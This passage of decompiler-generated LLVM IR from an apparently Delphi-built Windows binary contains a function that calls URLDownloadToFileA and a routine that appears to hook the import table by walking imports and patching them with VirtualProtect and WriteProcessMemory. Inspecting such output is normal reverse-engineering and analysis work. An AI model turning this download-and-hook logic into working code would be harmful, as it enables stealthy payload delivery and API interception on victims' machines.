  %29 = add i32 %esp.0.reload, -8, !insn.addr !405
  %30 = inttoptr i32 %29 to i32*, !insn.addr !405
  store i32 ptrtoint (i32* @global_var_404c3c to i32), i32* %30, align 4, !insn.addr !405
  %31 = call i32 @function_404ad0(), !insn.addr !406
  %32 = call i32 @"@LStrFromChar"(), !insn.addr !407
  %33 = add i32 %esp.0.reload, -12, !insn.addr !408
  %34 = inttoptr i32 %33 to i32*, !insn.addr !408
  store i32 0, i32* %34, align 4, !insn.addr !408
  %35 = call i32 @function_404ad0(), !insn.addr !409
  %36 = call i32 @"@LStrFromChar"(), !insn.addr !410
  %37 = add i32 %esp.0.reload, -16, !insn.addr !411
  %38 = inttoptr i32 %37 to i32*, !insn.addr !411
  store i32 0, i32* %38, align 4, !insn.addr !411
  %39 = call i32 @"@LStrCatN"(), !insn.addr !412
  store i32 %37, i32* %esp.1.reg2mem, !insn.addr !413
  br label %dec_label_pc_404be1, !insn.addr !413

dec_label_pc_404bc8:                              ; preds = %dec_label_pc_404b71
  %40 = call i32 @"@LStrFromChar"(), !insn.addr !414
  %41 = call i32 @"@LStrCat"(), !insn.addr !415
  store i32 %esp.0.reload, i32* %esp.1.reg2mem, !insn.addr !415
  br label %dec_label_pc_404be1, !insn.addr !415

dec_label_pc_404be1:                              ; preds = %dec_label_pc_404bc8, %dec_label_pc_404b73, %dec_label_pc_404b3f
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %42 = add i32 %ebx.0.reload, 1, !insn.addr !416
  %43 = add i32 %esi.0.reload, -1, !insn.addr !417
  %44 = icmp eq i32 %43, 0, !insn.addr !417
  %45 = icmp eq i1 %44, false, !insn.addr !418
  store i32 %42, i32* %ebx.0.reg2mem, !insn.addr !418
  store i32 %esp.1.reload, i32* %esp.0.reg2mem, !insn.addr !418
  store i32 %43, i32* %esi.0.reg2mem, !insn.addr !418
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !418
  br i1 %45, label %dec_label_pc_404b35, label %dec_label_pc_404be9, !insn.addr !418

dec_label_pc_404be9:                              ; preds = %dec_label_pc_404be1, %dec_label_pc_404ae8
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %46 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !419
  %47 = load i32, i32* %46, align 4, !insn.addr !419
  call void @__writefsdword(i32 0, i32 %47), !insn.addr !420
  %48 = add i32 %esp.2.reload, 8, !insn.addr !421
  %49 = inttoptr i32 %48 to i32*, !insn.addr !421
  store i32 4213779, i32* %49, align 4, !insn.addr !421
  %50 = call i32 @"@LStrArrayClr"(), !insn.addr !422
  %51 = call i32 @"@LStrClr"(), !insn.addr !423
  ret i32 %51, !insn.addr !424
}

define i32 @function_404c0c() local_unnamed_addr {
dec_label_pc_404c0c:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !425
  ret i32 %0, !insn.addr !425
}

define i32 @function_404c11() local_unnamed_addr {
dec_label_pc_404c11:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !426
}

define i32 @function_404c13(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404c13:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !427
}

define i32 @function_404c37() local_unnamed_addr {
dec_label_pc_404c37:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !428
  %2 = inttoptr i32 %0 to i32*, !insn.addr !428
  store i32 %1, i32* %2, align 4, !insn.addr !428
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !429
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !429
  %7 = add i8 %4, %6, !insn.addr !429
  %8 = inttoptr i32 %5 to i8*, !insn.addr !429
  store i8 %7, i8* %8, align 1, !insn.addr !429
  %9 = load i8, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !430
  %10 = load i32, i32* %eax, align 4, !insn.addr !430
  %11 = udiv i32 %10, 256, !insn.addr !430
  %12 = trunc i32 %11 to i8, !insn.addr !430
  %13 = add i8 %9, %12, !insn.addr !430
  store i8 %13, i8* inttoptr (i32 1426063360 to i8*), align 16777216, !insn.addr !430
  %14 = call i32 @function_4036b8(), !insn.addr !431
  %15 = call i32 @__readfsdword(i32 0), !insn.addr !432
  store i32 %15, i32* %stack_var_-24, align 4, !insn.addr !432
  %16 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !432
  call void @__writefsdword(i32 0, i32 %16), !insn.addr !433
  %17 = call i32 @"@LStrCatN"(), !insn.addr !434
  %18 = call i32 @function_4036c8(), !insn.addr !435
  %19 = inttoptr i32 %18 to i32*, !insn.addr !436
  %20 = call i32 @URLDownloadToFileA(i32* %19, i8* null, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !436
  call void @__writefsdword(i32 0, i32 0), !insn.addr !437
  %21 = call i32 @"@LStrArrayClr"(), !insn.addr !438
  ret i32 %21, !insn.addr !439
}

define i32 @function_404c40() local_unnamed_addr {
dec_label_pc_404c40:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_404cae() local_unnamed_addr {
dec_label_pc_404cae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !440
  ret i32 %0, !insn.addr !440
}

define i32 @function_404cb3() local_unnamed_addr {
dec_label_pc_404cb3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !441
}

define i32 @function_404cb5(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404cb5:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !442
}

define i32 @function_404cbf() local_unnamed_addr {
dec_label_pc_404cbf:
  %edi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %4 = add i32 %3, 1, !insn.addr !443
  %5 = inttoptr i32 %3 to i32*, !insn.addr !443
  store i32 %4, i32* %5, align 4, !insn.addr !443
  %6 = bitcast i32* %eax to i8*
  %7 = load i8, i8* %6, align 4, !insn.addr !444
  %8 = load i32, i32* %eax, align 4
  %9 = trunc i32 %8 to i8, !insn.addr !444
  %10 = add i8 %7, %9, !insn.addr !444
  %11 = inttoptr i32 %8 to i8*, !insn.addr !444
  store i8 %10, i8* %11, align 1, !insn.addr !444
  %12 = bitcast i32* %edi to i8*
  %13 = load i8, i8* %12, align 4, !insn.addr !445
  %14 = udiv i32 %1, 256, !insn.addr !445
  %15 = trunc i32 %14 to i8, !insn.addr !445
  %16 = add i8 %13, %15, !insn.addr !445
  %17 = load i32, i32* %edi, align 4, !insn.addr !445
  %18 = inttoptr i32 %17 to i8*, !insn.addr !445
  store i8 %16, i8* %18, align 1, !insn.addr !445
  %19 = load i8, i8* %6, align 4, !insn.addr !446
  %20 = load i32, i32* %eax, align 4
  %21 = trunc i32 %20 to i8, !insn.addr !446
  %22 = add i8 %19, %21, !insn.addr !446
  %23 = inttoptr i32 %20 to i8*, !insn.addr !446
  store i8 %22, i8* %23, align 1, !insn.addr !446
  %24 = add i32 %0, -117, !insn.addr !447
  %25 = inttoptr i32 %24 to i8*, !insn.addr !447
  %26 = load i8, i8* %25, align 1, !insn.addr !447
  %27 = trunc i32 %2 to i8, !insn.addr !447
  %28 = add i8 %26, %27, !insn.addr !447
  store i8 %28, i8* %25, align 1, !insn.addr !447
  %29 = trunc i32 %2 to i16, !insn.addr !448
  %30 = call i8 @__asm_in(i16 %29), !insn.addr !448
  %31 = call i32 @__readfsdword(i32 0), !insn.addr !449
  store i32 %31, i32* %stack_var_-12, align 4, !insn.addr !449
  %32 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !449
  call void @__writefsdword(i32 0, i32 %32), !insn.addr !450
  %33 = load i32, i32* @global_var_40969c, align 4, !insn.addr !451
  %34 = add i32 %33, 1, !insn.addr !451
  store i32 %34, i32* @global_var_40969c, align 4, !insn.addr !451
  %35 = load i32, i32* %stack_var_-12, align 4, !insn.addr !452
  call void @__writefsdword(i32 0, i32 %35), !insn.addr !453
  ret i32 0, !insn.addr !454
}

define i32 @function_404ced() local_unnamed_addr {
dec_label_pc_404ced:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !455
  ret i32 %0, !insn.addr !455
}

define i32 @function_404cf2() local_unnamed_addr {
dec_label_pc_404cf2:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !456
}

define i32 @function_404cf4(i32 %arg1) local_unnamed_addr {
dec_label_pc_404cf4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !457
}

define i32 @function_404cf8() local_unnamed_addr {
dec_label_pc_404cf8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_40969c, align 4, !insn.addr !458
  %2 = add i32 %1, -1, !insn.addr !458
  store i32 %2, i32* @global_var_40969c, align 4, !insn.addr !458
  ret i32 %0, !insn.addr !459
}

define i32* @function_404d00(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size) local_unnamed_addr {
dec_label_pc_404d00:
  %0 = call i32* @ImageDirectoryEntryToData(i32* %Base, i8 %MappedAsImage, i16 %DirectoryEntry, i32* %Size), !insn.addr !460
  ret i32* %0, !insn.addr !460
}

define i32 @function_404d08() local_unnamed_addr {
dec_label_pc_404d08:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !461
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !461
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !461
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !462
  %2 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !463
  %3 = add i32 %2, 1, !insn.addr !463
  store i32 %3, i32* @global_var_4096a0, align 4, !insn.addr !463
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !464
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !465
  ret i32 0, !insn.addr !466
}

define i32 @function_404d2d() local_unnamed_addr {
dec_label_pc_404d2d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !467
  ret i32 %0, !insn.addr !467
}

define i32 @function_404d32() local_unnamed_addr {
dec_label_pc_404d32:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !468
}

define i32 @function_404d34(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d34:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !469
}

define i32 @function_404d38() local_unnamed_addr {
dec_label_pc_404d38:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096a0, align 4, !insn.addr !470
  %2 = add i32 %1, -1, !insn.addr !470
  store i32 %2, i32* @global_var_4096a0, align 4, !insn.addr !470
  ret i32 %0, !insn.addr !471
}

define i32 @function_404d98(i8* %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_404d98:
  %esp.1.reg2mem = alloca i32, !insn.addr !472
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !472
  %eax.0.reg2mem = alloca i32, !insn.addr !472
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %6 = trunc i32 %4 to i8, !insn.addr !473
  %7 = icmp eq i8 %6, 0, !insn.addr !473
  store i32* %stack_var_-20, i32** %esp.0.in.reg2mem, !insn.addr !474
  br i1 %7, label %dec_label_pc_404dab, label %dec_label_pc_404da3, !insn.addr !474

dec_label_pc_404da3:                              ; preds = %dec_label_pc_404d98
  %8 = call i32 @"@ClassCreate"(i32 %2, i32 %5, i32 %3, i32 %1, i32 %0), !insn.addr !475
  store i32 %8, i32* %eax.0.reg2mem, !insn.addr !475
  store i32* %stack_var_-36, i32** %esp.0.in.reg2mem, !insn.addr !475
  br label %dec_label_pc_404dab, !insn.addr !475

dec_label_pc_404dab:                              ; preds = %dec_label_pc_404da3, %dec_label_pc_404d98
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %9 = add i32 %esp.0, -4, !insn.addr !476
  %10 = and i32 %4, 255
  %11 = inttoptr i32 %10 to i8*, !insn.addr !477
  %12 = call i32* @GetModuleHandleA(i8* %11), !insn.addr !477
  %13 = ptrtoint i32* %12 to i32, !insn.addr !477
  %14 = add i32 %eax.0.reload, 8, !insn.addr !478
  %15 = inttoptr i32 %14 to i32*, !insn.addr !478
  store i32 %13, i32* %15, align 4, !insn.addr !478
  %16 = icmp eq i32* %12, null, !insn.addr !479
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !480
  br i1 %16, label %dec_label_pc_404e03, label %dec_label_pc_404dc7, !insn.addr !480

dec_label_pc_404dc7:                              ; preds = %dec_label_pc_404dab
  %17 = ptrtoint i8* %arg1 to i32, !insn.addr !481
  %18 = add i32 %eax.0.reload, 12, !insn.addr !482
  %19 = inttoptr i32 %18 to i32*, !insn.addr !482
  store i32 %17, i32* %19, align 4, !insn.addr !482
  %20 = ptrtoint i8* %arg2 to i32, !insn.addr !483
  %21 = add i32 %eax.0.reload, 16, !insn.addr !484
  %22 = inttoptr i32 %21 to i32*, !insn.addr !484
  store i32 %20, i32* %22, align 4, !insn.addr !484
  %23 = add i32 %eax.0.reload, 20, !insn.addr !485
  %24 = inttoptr i32 %23 to i32*, !insn.addr !485
  store i32 %arg3, i32* %24, align 4, !insn.addr !485
  %25 = load i32, i32* %22, align 4, !insn.addr !486
  %26 = add i32 %esp.0, -8, !insn.addr !487
  %27 = inttoptr i32 %26 to i32*, !insn.addr !487
  store i32 %25, i32* %27, align 4, !insn.addr !487
  %28 = add i32 %esp.0, -12, !insn.addr !488
  %29 = inttoptr i32 %28 to i32*, !insn.addr !488
  store i32 %17, i32* %29, align 4, !insn.addr !488
  %30 = call i32* @GetModuleHandleA(i8* bitcast (i32* @0 to i8*)), !insn.addr !489
  %31 = ptrtoint i32* %30 to i32, !insn.addr !489
  %32 = add i32 %esp.0, -16, !insn.addr !490
  %33 = inttoptr i32 %32 to i32*, !insn.addr !490
  store i32 %31, i32* %33, align 4, !insn.addr !490
  %34 = call i32 ()* @GetProcAddress(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !491
  %35 = ptrtoint i32 ()* %34 to i32, !insn.addr !491
  %36 = add i32 %eax.0.reload, 24, !insn.addr !492
  %37 = inttoptr i32 %36 to i32*, !insn.addr !492
  store i32 %35, i32* %37, align 4, !insn.addr !492
  %38 = icmp eq i32 ()* %34, null, !insn.addr !493
  store i32 %32, i32* %esp.1.reg2mem, !insn.addr !494
  br i1 %38, label %dec_label_pc_404e03, label %dec_label_pc_404def, !insn.addr !494

dec_label_pc_404def:                              ; preds = %dec_label_pc_404dc7
  %39 = load i32, i32* %24, align 4, !insn.addr !495
  %40 = add i32 %esp.0, -20, !insn.addr !496
  %41 = inttoptr i32 %40 to i32*, !insn.addr !496
  store i32 %39, i32* %41, align 4, !insn.addr !496
  %42 = load i32, i32* %15, align 4, !insn.addr !497
  %43 = add i32 %esp.0, -24, !insn.addr !498
  %44 = inttoptr i32 %43 to i32*, !insn.addr !498
  store i32 %42, i32* %44, align 4, !insn.addr !498
  %45 = call i32 @function_404e6c(i32 ptrtoint (i32* @0 to i32)), !insn.addr !499
  store i32 %43, i32* %esp.1.reg2mem, !insn.addr !499
  br label %dec_label_pc_404e03, !insn.addr !499

dec_label_pc_404e03:                              ; preds = %dec_label_pc_404def, %dec_label_pc_404dc7, %dec_label_pc_404dab
  br i1 %7, label %dec_label_pc_404e1a, label %dec_label_pc_404e0b, !insn.addr !500

dec_label_pc_404e0b:                              ; preds = %dec_label_pc_404e03
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %46 = call i32 @function_402b48(), !insn.addr !501
  %47 = inttoptr i32 %esp.1.reload to i32*, !insn.addr !502
  %48 = load i32, i32* %47, align 4, !insn.addr !502
  call void @__writefsdword(i32 0, i32 %48), !insn.addr !502
  br label %dec_label_pc_404e1a, !insn.addr !503

dec_label_pc_404e1a:                              ; preds = %dec_label_pc_404e0b, %dec_label_pc_404e03
  %49 = add i32 %eax.0.reload, 4, !insn.addr !504
  %50 = inttoptr i32 %49 to i32*, !insn.addr !504
  %51 = inttoptr i32 %9 to i32*, !insn.addr !476
  ret i32 %eax.0.reload, !insn.addr !505
}

define i32 @function_404e24() local_unnamed_addr {
dec_label_pc_404e24:
  %eax.1.reg2mem = alloca i32, !insn.addr !506
  %eax.0.reg2mem = alloca i32, !insn.addr !506
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @"@BeforeDestruction"(i32 %1, i32 %0), !insn.addr !507
  %4 = add i32 %3, 8, !insn.addr !508
  %5 = inttoptr i32 %4 to i32*, !insn.addr !508
  %6 = load i32, i32* %5, align 4, !insn.addr !508
  %7 = icmp eq i32 %6, 0, !insn.addr !508
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !509
  br i1 %7, label %dec_label_pc_404e5e, label %dec_label_pc_404e35, !insn.addr !509

dec_label_pc_404e35:                              ; preds = %dec_label_pc_404e24
  %8 = add i32 %3, 24, !insn.addr !510
  %9 = inttoptr i32 %8 to i32*, !insn.addr !510
  %10 = load i32, i32* %9, align 4, !insn.addr !510
  %11 = icmp eq i32 %10, 0, !insn.addr !510
  store i32 %3, i32* %eax.0.reg2mem, !insn.addr !511
  br i1 %11, label %dec_label_pc_404e5e, label %dec_label_pc_404e3b, !insn.addr !511

dec_label_pc_404e3b:                              ; preds = %dec_label_pc_404e35
  %12 = add i32 %3, 4, !insn.addr !512
  %13 = inttoptr i32 %12 to i32*, !insn.addr !512
  %14 = load i32, i32* %13, align 4, !insn.addr !512
  %15 = inttoptr i32 %14 to i8*, !insn.addr !513
  %16 = call i32* @GetModuleHandleA(i8* %15), !insn.addr !514
  %17 = ptrtoint i32* %16 to i32, !insn.addr !514
  %18 = load i32, i32* %5, align 4, !insn.addr !515
  %19 = icmp eq i32 %18, %17, !insn.addr !515
  %20 = icmp eq i1 %19, false, !insn.addr !516
  store i32 %17, i32* %eax.0.reg2mem, !insn.addr !516
  br i1 %20, label %dec_label_pc_404e5e, label %dec_label_pc_404e49, !insn.addr !516

dec_label_pc_404e49:                              ; preds = %dec_label_pc_404e3b
  %21 = load i32, i32* %9, align 4, !insn.addr !517
  %22 = call i32 @function_404e6c(i32 %21), !insn.addr !518
  store i32 %22, i32* %eax.0.reg2mem, !insn.addr !518
  br label %dec_label_pc_404e5e, !insn.addr !518

dec_label_pc_404e5e:                              ; preds = %dec_label_pc_404e49, %dec_label_pc_404e3b, %dec_label_pc_404e35, %dec_label_pc_404e24
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  %23 = trunc i32 %2 to i8, !insn.addr !519
  %24 = icmp slt i8 %23, 1
  store i32 %eax.0.reload, i32* %eax.1.reg2mem, !insn.addr !520
  br i1 %24, label %dec_label_pc_404e69, label %dec_label_pc_404e62, !insn.addr !520

dec_label_pc_404e62:                              ; preds = %dec_label_pc_404e5e
  %25 = call i32 @"@ClassDestroy"(), !insn.addr !521
  store i32 %25, i32* %eax.1.reg2mem, !insn.addr !521
  br label %dec_label_pc_404e69, !insn.addr !521

dec_label_pc_404e69:                              ; preds = %dec_label_pc_404e62, %dec_label_pc_404e5e
  %eax.1.reload = load i32, i32* %eax.1.reg2mem
  ret i32 %eax.1.reload, !insn.addr !522
}

define i32 @function_404e6c(i32 %arg1) local_unnamed_addr {
dec_label_pc_404e6c:
  %eax.0.reg2mem = alloca i32, !insn.addr !523
  %esp.0.reg2mem = alloca i32, !insn.addr !523
  %storemerge6.reg2mem = alloca i32, !insn.addr !523
  %.reg2mem14 = alloca i32, !insn.addr !523
  %esp.17.reg2mem = alloca i32, !insn.addr !523
  %esi.08.reg2mem = alloca i32, !insn.addr !523
  %.reg2mem = alloca i32, !insn.addr !523
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_8 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %3 = icmp sgt i32 %arg1, -1, !insn.addr !524
  %4 = icmp eq i1 %3, false, !insn.addr !525
  %5 = icmp eq i32 %arg1, 0, !insn.addr !526
  %or.cond = or i1 %5, %4
  br i1 %or.cond, label %dec_label_pc_404f19, label %dec_label_pc_404e92, !insn.addr !525

dec_label_pc_404e92:                              ; preds = %dec_label_pc_404e6c
  %6 = trunc i32 %2 to i16, !insn.addr !527
  %7 = trunc i32 %1 to i8, !insn.addr !528
  store i32 %arg1, i32* %stack_var_-52, align 4, !insn.addr !529
  %8 = inttoptr i32 %0 to i32*, !insn.addr !530
  %9 = call i32* @ImageDirectoryEntryToData(i32* %8, i8 %7, i16 %6, i32* nonnull @0), !insn.addr !530
  %10 = ptrtoint i32* %9 to i32, !insn.addr !530
  %11 = icmp eq i32* %9, null, !insn.addr !531
  store i32 %10, i32* %eax.0.reg2mem, !insn.addr !532
  br i1 %11, label %dec_label_pc_404f19, label %dec_label_pc_404f12.preheader, !insn.addr !532

dec_label_pc_404f12.preheader:                    ; preds = %dec_label_pc_404e92
  %12 = add i32 %10, 12, !insn.addr !533
  %13 = inttoptr i32 %12 to i32*, !insn.addr !533
  %14 = load i32, i32* %13, align 4, !insn.addr !533
  %15 = icmp eq i32 %14, 0, !insn.addr !534
  %16 = icmp eq i1 %15, false, !insn.addr !535
  store i32 %14, i32* %eax.0.reg2mem, !insn.addr !535
  br i1 %16, label %dec_label_pc_404eab.lr.ph, label %dec_label_pc_404f19, !insn.addr !535

dec_label_pc_404eab.lr.ph:                        ; preds = %dec_label_pc_404f12.preheader
  %17 = ptrtoint i32* %stack_var_-52 to i32, !insn.addr !529
  %sext = mul i32 %1, 16777216
  %18 = sdiv i32 %sext, 16777216, !insn.addr !536
  %sext4 = mul i32 %2, 65536
  %19 = sdiv i32 %sext4, 65536
  %20 = ptrtoint i32* %stack_var_-20 to i32
  %21 = ptrtoint i32* %stack_var_-24 to i32
  %22 = ptrtoint i32* %stack_var_8 to i32
  store i32 %14, i32* %.reg2mem
  store i32 %10, i32* %esi.08.reg2mem
  store i32 %17, i32* %esp.17.reg2mem
  br label %dec_label_pc_404eab

dec_label_pc_404eab:                              ; preds = %dec_label_pc_404eab.lr.ph, %dec_label_pc_404f0f
  %esp.17.reload = load i32, i32* %esp.17.reg2mem
  %esi.08.reload = load i32, i32* %esi.08.reg2mem
  %.reload = load i32, i32* %.reg2mem
  %23 = add i32 %.reload, %arg1, !insn.addr !537
  %24 = add i32 %esp.17.reload, -4, !insn.addr !538
  %25 = inttoptr i32 %24 to i32*, !insn.addr !538
  store i32 %18, i32* %25, align 4, !insn.addr !538
  %26 = add i32 %esp.17.reload, -8, !insn.addr !539
  %27 = inttoptr i32 %26 to i32*, !insn.addr !539
  store i32 %23, i32* %27, align 4, !insn.addr !539
  %28 = call i32 @lstrcmpiA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !540
  %29 = icmp eq i32 %28, 0, !insn.addr !541
  %30 = icmp eq i1 %29, false, !insn.addr !542
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !542
  br i1 %30, label %dec_label_pc_404f0f, label %dec_label_pc_404ebe, !insn.addr !542

dec_label_pc_404ebe:                              ; preds = %dec_label_pc_404eab
  %31 = add i32 %esi.08.reload, 16, !insn.addr !543
  %32 = inttoptr i32 %31 to i32*, !insn.addr !543
  %33 = load i32, i32* %32, align 4, !insn.addr !543
  %34 = add i32 %33, %arg1, !insn.addr !544
  %35 = inttoptr i32 %34 to i32*, !insn.addr !545
  %36 = load i32, i32* %35, align 4, !insn.addr !545
  %37 = icmp eq i32 %36, 0, !insn.addr !546
  %38 = icmp eq i1 %37, false, !insn.addr !547
  store i32 %36, i32* %.reg2mem14, !insn.addr !547
  store i32 %34, i32* %storemerge6.reg2mem, !insn.addr !547
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !547
  br i1 %38, label %dec_label_pc_404ec6, label %dec_label_pc_404f0f, !insn.addr !547

dec_label_pc_404ec6:                              ; preds = %dec_label_pc_404ebe, %dec_label_pc_404f06
  %storemerge6.reload = load i32, i32* %storemerge6.reg2mem
  %.reload15 = load i32, i32* %.reg2mem14
  %39 = icmp eq i32 %.reload15, %19, !insn.addr !548
  %40 = icmp eq i1 %39, false, !insn.addr !549
  br i1 %40, label %dec_label_pc_404f06, label %dec_label_pc_404ecb, !insn.addr !549

dec_label_pc_404ecb:                              ; preds = %dec_label_pc_404ec6
  %41 = add i32 %esp.17.reload, -12, !insn.addr !550
  %42 = inttoptr i32 %41 to i32*, !insn.addr !550
  store i32 %20, i32* %42, align 4, !insn.addr !550
  %43 = add i32 %esp.17.reload, -16, !insn.addr !551
  %44 = inttoptr i32 %43 to i32*, !insn.addr !551
  store i32 128, i32* %44, align 4, !insn.addr !551
  %45 = add i32 %esp.17.reload, -20, !insn.addr !552
  %46 = inttoptr i32 %45 to i32*, !insn.addr !552
  store i32 4, i32* %46, align 4, !insn.addr !552
  %47 = add i32 %esp.17.reload, -24, !insn.addr !553
  %48 = inttoptr i32 %47 to i32*, !insn.addr !553
  store i32 %storemerge6.reload, i32* %48, align 4, !insn.addr !553
  %49 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !554
  %50 = add i32 %esp.17.reload, -28, !insn.addr !555
  %51 = inttoptr i32 %50 to i32*, !insn.addr !555
  store i32 %21, i32* %51, align 4, !insn.addr !555
  %52 = add i32 %esp.17.reload, -32, !insn.addr !556
  %53 = inttoptr i32 %52 to i32*, !insn.addr !556
  store i32 4, i32* %53, align 4, !insn.addr !556
  %54 = add i32 %esp.17.reload, -36, !insn.addr !557
  %55 = inttoptr i32 %54 to i32*, !insn.addr !557
  store i32 %22, i32* %55, align 4, !insn.addr !557
  %56 = add i32 %esp.17.reload, -40, !insn.addr !558
  %57 = inttoptr i32 %56 to i32*, !insn.addr !558
  store i32 %storemerge6.reload, i32* %57, align 4, !insn.addr !558
  %58 = call i32* @GetCurrentProcess(), !insn.addr !559
  %59 = ptrtoint i32* %58 to i32, !insn.addr !559
  %60 = add i32 %esp.17.reload, -44, !insn.addr !560
  %61 = inttoptr i32 %60 to i32*, !insn.addr !560
  store i32 %59, i32* %61, align 4, !insn.addr !560
  %62 = call i1 @WriteProcessMemory(i32* nonnull @0, i32* nonnull @0, i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !561
  %63 = add i32 %esp.17.reload, -48, !insn.addr !562
  %64 = inttoptr i32 %63 to i32*, !insn.addr !562
  store i32 %21, i32* %64, align 4, !insn.addr !562
  %65 = load i32, i32* %stack_var_-20, align 4, !insn.addr !563
  %66 = add i32 %esp.17.reload, -52, !insn.addr !564
  %67 = inttoptr i32 %66 to i32*, !insn.addr !564
  store i32 %65, i32* %67, align 4, !insn.addr !564
  %68 = add i32 %esp.17.reload, -56, !insn.addr !565
  %69 = inttoptr i32 %68 to i32*, !insn.addr !565
  store i32 4, i32* %69, align 4, !insn.addr !565
  %70 = add i32 %esp.17.reload, -60, !insn.addr !566
  %71 = inttoptr i32 %70 to i32*, !insn.addr !566
  store i32 %storemerge6.reload, i32* %71, align 4, !insn.addr !566
  %72 = call i1 @VirtualProtect(i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !567
  store i32 %70, i32* %esp.0.reg2mem, !insn.addr !568
  br label %dec_label_pc_404f0f, !insn.addr !568

dec_label_pc_404f06:                              ; preds = %dec_label_pc_404ec6
  %73 = add i32 %storemerge6.reload, 4, !insn.addr !569
  %74 = inttoptr i32 %73 to i32*, !insn.addr !545
  %75 = load i32, i32* %74, align 4, !insn.addr !545
  %76 = icmp eq i32 %75, 0, !insn.addr !546
  %77 = icmp eq i1 %76, false, !insn.addr !547
  store i32 %75, i32* %.reg2mem14, !insn.addr !547
  store i32 %73, i32* %storemerge6.reg2mem, !insn.addr !547
  store i32 %26, i32* %esp.0.reg2mem, !insn.addr !547
  br i1 %77, label %dec_label_pc_404ec6, label %dec_label_pc_404f0f, !insn.addr !547

dec_label_pc_404f0f:                              ; preds = %dec_label_pc_404f06, %dec_label_pc_404ebe, %dec_label_pc_404ecb, %dec_label_pc_404eab
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %78 = add i32 %esi.08.reload, 20, !insn.addr !570
  %79 = add i32 %esi.08.reload, 32, !insn.addr !533
  %80 = inttoptr i32 %79 to i32*, !insn.addr !533
